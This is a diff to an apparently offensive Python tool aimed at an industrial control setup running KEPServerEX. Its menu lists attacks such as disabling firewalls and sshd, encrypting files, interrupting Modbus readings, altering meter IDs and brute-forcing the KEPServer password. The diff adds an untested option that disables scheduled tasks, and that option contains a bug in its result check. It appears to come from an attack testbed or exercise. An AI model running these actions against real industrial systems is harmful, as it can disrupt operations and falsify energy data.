@@ -1088,6 +1088,18 @@ def kep_get_single_user(user):
     server = kep_connect()
     print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)
 
+def disable_running_schedules() -> None:
+    # NOTE: UNTESTED
+    cp = run(["schtasks", "/change", "/TN", "'\MoveFiles'", "/disable"], stdout=PIPE, check=False)
+    output = cp.stdout.decode('utf-8').strip().split()
+    if "SUCCESS:" in output:
+        print("Successfully disabled \MoveFiles Tasks Scheduler")
+        print("Ok.")
+
+    cp = run(["schtasks", "/change", "/TN", "'\KEPServerEX 6.12'", "/disable"], stdout=PIPE, check=False)
+    if "SUCCESS:" in output:
+        print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler")
+        print("Ok.")
 
 if __name__ == '__main__':
     attackoption = str(argv[1])
@@ -1145,6 +1157,8 @@ if __name__ == '__main__':
        kep_disable_user("User1")
     elif attackoption == "19":
        kep_get_single_user("User1")
+    elif attackoption == "20":
+       disable_running_schedules()
     elif attackoption == "-h":
         print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
 
